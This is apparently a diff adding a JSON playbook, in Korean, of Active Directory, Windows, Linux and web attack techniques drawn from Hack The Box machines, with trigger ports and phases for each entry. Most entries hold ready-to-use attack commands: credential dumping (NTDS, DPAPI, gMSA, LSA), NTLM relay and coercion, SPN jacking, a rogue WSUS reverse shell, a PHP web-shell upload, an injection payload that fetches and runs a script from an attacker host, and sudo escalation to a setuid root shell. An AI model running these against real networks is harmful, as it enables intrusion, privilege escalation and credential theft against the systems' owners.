@@ -1,0 +1,204 @@
+[
+  {
+    "name": "NTLM 비활성 도메인 = Kerberos 전용 워크플로우",
+    "when": {"ports": [88, 445], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Voleur/Logging: nxc/smbclient 가 STATUS_NOT_SUPPORTED 면 NTLM 비활성 → Kerberos(-k) 필수. 1) /etc/hosts 에 DC FQDN+도메인, 2) nxc smb <dc> -u u -p p -k --generate-krb5-file out.krb5 → /etc/krb5.conf 작성(realm 대문자), 3) sudo ntpdate <dc>(시계동기, KRB_AP_ERR_SKEW 방지), 4) impacket-getTGT <dom>/<user>:<pw> → export KRB5CCNAME=user.ccache 후 모든 도구 -k.",
+    "tags": ["ad", "kerberos", "ntlm-disabled"],
+    "phase": "enum"
+  },
+  {
+    "name": "Protected Users 그룹(NTLM 차단)",
+    "when": {"ports": [88], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Logging: 자격이 맞는데 STATUS_ACCOUNT_RESTRICTION → Protected Users 멤버(NTLM 금지, Kerberos만). 확인 nxc ldap <dc> -u u -p p --groups 'Protected Users'. getTGT 로 TGT 발급 후 -k 사용. 비번 패턴(예: Base<연도>)이면 현재 연도로 증가 시도.",
+    "tags": ["ad", "protected-users", "kerberos"],
+    "phase": "access"
+  },
+  {
+    "name": "Shadow Credentials 공격(GenericWrite/WriteProperty)",
+    "when": {"ports": [389, 636], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Logging: 대상 user/computer/MSA 에 GenericWrite/GenericAll 있으면 msDS-KeyCredentialLink 에 인증서 추가→PKINIT 로 NT해시 복구. bloodyAD --host <dc> -d <dom> -u <me> -k add shadowCredentials <target> → cert/key pem. PKINITtools: gettgtpkinit.py -cert-pem c.pem -key-pem k.pem <dom>/<target> t.ccache → getnthash.py -key <AS-REP key> <dom>/<target> → NT해시 → PtH.",
+    "tags": ["ad", "shadow-credentials", "pkinit"],
+    "phase": "privesc"
+  },
+  {
+    "name": "gMSA 비밀번호 읽기(ReadGMSAPassword)",
+    "when": {"ports": [389, 445], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Pirate: 어떤 principal 이 gMSA 에 ReadGMSAPassword(msDS-GroupMSAMembership) 보유 시 NT해시 획득. gMSADumper.py -u <user> -p <pass> -d <dom> (또는 -k). nxc ldap <dc> --gmsa. gMSA 가 Remote Management Users 면 evil-winrm -u 'gMSA$' -H <hash>.",
+    "tags": ["ad", "gmsa", "readgmsapassword"],
+    "phase": "lateral"
+  },
+  {
+    "name": "Pre-Windows 2000 컴퓨터 계정",
+    "when": {"ports": [445], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Pirate: Pre-Windows 2000 Compatible Access 로 만든 컴퓨터계정은 비번=컴퓨터명 소문자(ms01$→ms01). nxc smb -u 'MS01$' -p ms01 가 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT(만료) 면 impacket-changepasswd -p rpc-samr <dom>/'MS01$':ms01@<dc> -newpass 'New!' 로 변경 후 사용.",
+    "tags": ["ad", "pre-windows-2000", "computer-account"],
+    "phase": "access"
+  },
+  {
+    "name": "targeted Kerberoasting(WriteSPN)",
+    "when": {"ports": [88, 389], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Voleur: 대상 user 에 WriteSPN(또는 GenericWrite) 있으면 SPN 임시설정→TGS요청→크랙→SPN제거. getTGT 로 내 TGT 후 targetedKerberoast.py -d <dom> --dc-host <dc> -u <me>@<dom> -k → $krb5tgs$ → hashcat -m13100 rockyou. 서비스계정 비번 획득.",
+    "tags": ["ad", "kerberoast", "writespn"],
+    "phase": "lateral"
+  },
+  {
+    "name": "AD 휴지통 삭제객체 복원(Restore Users)",
+    "when": {"ports": [389], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Voleur: Restore Users 그룹/삭제객체 복원권 보유 시. RunasCs.exe <user> <pass> 'powershell -c Get-ADObject -Filter {isDeleted -eq \\$true} -IncludeDeletedObjects -SearchBase \"CN=Deleted Objects,DC=d,DC=htb\"' → 삭제 사용자 확인 → Restore-ADObject -Identity '<deleted DN>' → 복원 후 알려진 비번(스프레드시트 등)으로 getTGT.",
+    "tags": ["ad", "recycle-bin", "restore-adobject"],
+    "phase": "lateral"
+  },
+  {
+    "name": "DPAPI 자격 복구",
+    "when": {"os": ["windows", "windows_ad"]},
+    "suggest": [],
+    "note": "HTB Voleur: Credentials/Vault blob + masterkey 확보 시. impacket-dpapi masterkey -file <mk> -password <userpw> (또는 -sid+-pvk). impacket-dpapi credential -file <blob> -key <decrypted mk> → 평문자격. Windows 상에서 mimikatz dpapi::cred. AppData\\Roaming\\Microsoft\\{Credentials,Protect} 위치.",
+    "tags": ["windows", "dpapi", "creds"],
+    "phase": "privesc"
+  },
+  {
+    "name": "NTDS.dit 오프라인 덤프",
+    "when": {"ports": [445], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Voleur: DC 관리자/백업권/볼륨섀도 확보 시. NTDS.dit+SYSTEM+SECURITY 하이브 추출(ntdsutil 'ac i ntds' 'ifm' 또는 백업파일) → impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL → 전 도메인 NT해시(Administrator:500) → PtH. 온라인은 impacket-secretsdump <dom>/<admin>@<dc> (DCSync).",
+    "tags": ["ad", "ntds", "secretsdump"],
+    "phase": "privesc"
+  },
+  {
+    "name": "NTLMv1 코어션 + 릴레이(RBCD)",
+    "when": {"ports": [445], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Pirate: LmCompatibilityLevel<=2(NTLMv1, MIC 없음) + WebClient(WebDAV, nxc -M webdav) → 릴레이 가능. dnstool.py 로 단일라벨 DNS 추가. impacket-ntlmrelayx -t ldap://<dc> -smb2support --delegate-access → PetitPotam.py -u 'acct$' -hashes :<h> relay@80/x <victim> 로 HTTP 코어션 → ntlmrelayx 가 새 머신계정+RBCD 설정 → getST -spn cifs/<victim> -impersonate Administrator → wmiexec.",
+    "tags": ["ad", "ntlmv1", "petitpotam", "rbcd", "coercion"],
+    "phase": "lateral"
+  },
+  {
+    "name": "SPN Jacking(WriteSPN + 제약위임)",
+    "when": {"ports": [88], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Pirate: 계정이 제약위임(w/ protocol transition) to HTTP/WEB01 + IT그룹 WriteSPN(모든 컴퓨터). impacket-findDelegation 로 확인. net rpc password 로 계정 장악 → addspn.py -t 'WEB01$' -c (HTTP/WEB01 제거) → addspn.py -t 'DC01$' --spn 'HTTP/WEB01' (DC 에 등록) → impacket-getST -spn 'HTTP/WEB01' -impersonate Administrator -altservice cifs/DC01 → wmiexec DC.",
+    "tags": ["ad", "spn-jacking", "delegation"],
+    "phase": "privesc"
+  },
+  {
+    "name": "AutoLogon DefaultPassword(LSA)",
+    "when": {"os": ["windows", "windows_ad"]},
+    "suggest": [],
+    "note": "HTB Pirate: AutoLogon 설정 호스트는 평문비번을 LSA secret 에 보관. impacket-secretsdump 또는 reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' /v DefaultPassword → 사용자 평문비번. secretsdump 출력의 [*] DefaultPassword 라인 확인.",
+    "tags": ["windows", "autologon", "lsa", "creds"],
+    "phase": "lateral"
+  },
+  {
+    "name": "ADCS ESC17 (서버인증 템플릿)",
+    "when": {"ports": [389, 445], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Logging: certipy find 로 취약 템플릿. ESC17=EnrolleeSuppliesSubject+Server Authentication+enroll권한 → 임의 DNS 이름 인증서 발급 가능(예: rogue WSUS TLS). certipy-esc17 req -u <user>@<dom> -k -target <dc> -template <T> -ca <CA> -dns <name> → pfx → openssl pkcs12 -in x.pfx -out x.pem -nodes.",
+    "tags": ["ad", "adcs", "esc17", "certipy"],
+    "phase": "privesc"
+  },
+  {
+    "name": "Rogue WSUS 공격",
+    "when": {"ports": [8530, 8531], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Logging: WUServer 레지스트리(reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer)가 wsus.<dom>:8531(DNS 없음) → dnstool.py 로 해당 DNS 를 공격자 IP 로. HTTPS 면 ADCS 로 해당 DNS 인증서 발급. sudo wsuks -t <dc> --serve-only --WSUS-Server <dc> --tls-cert wsus.pem -c '/accepteula /s cmd.exe \"/c rev.exe\"' → DC 가 가짜 업데이트 pull → PsExec SYSTEM.",
+    "tags": ["ad", "wsus", "wsuks"],
+    "phase": "privesc"
+  },
+  {
+    "name": "DLL 검색순서 하이재킹",
+    "when": {"os": ["windows", "windows_ad"]},
+    "suggest": [],
+    "note": "HTB Logging: 쓰기가능 경로(icacls 로 BUILTIN\\Users:(WD)) + 상위권한 작업/서비스가 거기서 DLL 로드. 로그/문서로 로드 DLL명 확인(ERROR_MOD_NOT_FOUND 126). dllhijack.c 작성(i686-w64-mingw32-gcc -shared), 보통 특정 export 함수 필요(로그 'X not found'). msfvenom 리버스셸 결합, 필요시 zip 포장 업로드 → 작업 주기 대기 → 해당 사용자 셸.",
+    "tags": ["windows", "dll-hijack", "privesc"],
+    "phase": "privesc"
+  },
+  {
+    "name": "Ligolo-ng 피벗(격리망)",
+    "when": {"os": ["windows", "linux"]},
+    "suggest": [],
+    "note": "HTB Pirate: 셸 호스트가 내부망(예 192.168.x) 접근 가능 시. 공격자: sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert -laddr 0.0.0.0:443. 대상: agent -connect {atk}:443 -ignore-cert. proxy 에서 session→start → sudo ip route add <subnet> dev ligolo → 내부호스트 직접 접근. (chisel/SSH -D SOCKS 대안)",
+    "tags": ["pivot", "ligolo", "tunneling"],
+    "phase": "lateral"
+  },
+  {
+    "name": "Laravel env 조작(CVE-2024-52301)",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [
+      "curl -s 'http://{t}/?--env=local'"
+    ],
+    "note": "HTB Environment: Laravel(에러페이지에 버전) 가 register_argc_argv on 이면 ?--env=<name> 쿼리로 $_SERVER['argv'] 주입→App::environment() 변경. 테스트로 푸터/동작 변화 확인. preprod/local 등 비정상 환경이 인증검사 생략/디버그 노출하면 POST /login?--env=preprod 로 우회.",
+    "tags": ["web", "laravel", "cve-2024-52301"],
+    "phase": "access"
+  },
+  {
+    "name": "Laravel File Manager RCE(CVE-2024-2154)",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Environment: 이미지 업로드가 Laravel File Manager(에러 'Some error occured during uploading')면 CVE-2024-2154. 이미지 바디에 <?php system($_GET['cmd']);?> 삽입, filename 이중확장자(shell.png.php). 업로드후 /storage/files/shell.png.php?cmd=id → RCE → 리버스셸.",
+    "tags": ["web", "laravel-filemanager", "cve-2024-2154", "rce"],
+    "phase": "access"
+  },
+  {
+    "name": "GPG 키 노출 복호화",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB Environment: ~/.gnupg 퍼미션 과다(755, private-keys-v1.d 읽기) + 암호화파일(*.gpg). zip -r /tmp/g.zip ~/.gnupg; cp <file>.gpg; 로컬 다운로드 → gpg --homedir ./gnupg --import; gpg --homedir ./gnupg -d file.gpg → 평문자격 → su/ssh.",
+    "tags": ["linux", "gpg", "creds"],
+    "phase": "lateral"
+  },
+  {
+    "name": "sudo BASH_ENV 임의실행",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB Environment: sudo -l 에서 env_keep+=BASH_ENV(또는 SETENV) + 스크립트 실행 허용 → 비대화형 bash 시작 시 BASH_ENV 스크립트 실행. echo 'cp /bin/bash /tmp/b;chmod +s /tmp/b' > /tmp/x.sh; sudo BASH_ENV=/tmp/x.sh <allowed_script> → /tmp/b -p → root. LD_PRELOAD/PYTHONPATH 류도 env_keep 확인.",
+    "tags": ["linux", "sudo", "bash_env", "privesc"],
+    "phase": "privesc"
+  },
+  {
+    "name": "IDOR 파일접근 + 파라미터 퍼징",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Nocturnal: view.php?username=<u>&file=<f> 류는 username/id 변조로 타 사용자 자원 접근(IDOR). 존재여부 응답차 이용해 ffuf -u 'http://{t}/view.php?username=FUZZ&file=x' -w Usernames/Names/names.txt -H 'Cookie: PHPSESSID=..' -fs <에러크기> 로 사용자 열거 → 각 사용자 파일 확인(평문자격 포함 문서).",
+    "tags": ["web", "idor", "ffuf"],
+    "phase": "access"
+  },
+  {
+    "name": "명령주입 공백/문자 필터 우회",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Nocturnal: 명령주입인데 blacklist(; & | $ space ` 등) 존재 시 우회. 공백→탭(%09)/${IFS}/{cmd,arg}. 명령구분→개행(%0a)/%0d. 소스 열람 가능하면 cleanEntry 블랙리스트 확인. 예) password=x%0acurl%09http://{atk}/s%09-o%09/tmp/s%0abash%09/tmp/s.",
+    "tags": ["web", "command-injection", "filter-bypass"],
+    "phase": "access"
+  },
+  {
+    "name": "웹루트 SQLite DB 자격탈취",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB Nocturnal: 셸 후 웹루트에서 *.db/*.sqlite 확인(find / -name '*.db' 2>/dev/null). sqlite3 app.db → .tables → SELECT * FROM users; → 해시 추출 → hashid → hashcat/john → 사용자 비번 재사용 ssh/su.",
+    "tags": ["linux", "sqlite", "creds"],
+    "phase": "lateral"
+  },
+  {
+    "name": "office2john 문서 비밀번호 크랙",
+    "when": {},
+    "suggest": [],
+    "note": "HTB Voleur: 암호보호 Office(xlsx/docx) 획득 시 office2john file.xlsx > hash; john -w=rockyou hash → 비번 → 문서 내 자격/정보. zip2john(zip), pdf2john(pdf), keepass2john(kdbx) 동일 패턴.",
+    "tags": ["crack", "office2john", "john"],
+    "phase": "access"
+  },
+  {
+    "name": "ISPConfig 인증후 RCE(CVE-2023-46818)",
+    "when": {"ports": [80, 443, 8080, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Nocturnal: 내부/외부 ISPConfig 패널(버전 확인). admin 자격(재사용/기본) 로그인 후 CVE-2023-46818(language file editor PHP 코드주입) → RCE as root(ISPConfig 가 root 로 실행). 공개 PoC 로 웹셸/리버스셸. 내부면 ssh -L 포워딩으로 접근.",
+    "tags": ["web", "ispconfig", "cve-2023-46818", "rce"],
+    "phase": "privesc"
+  }
+]
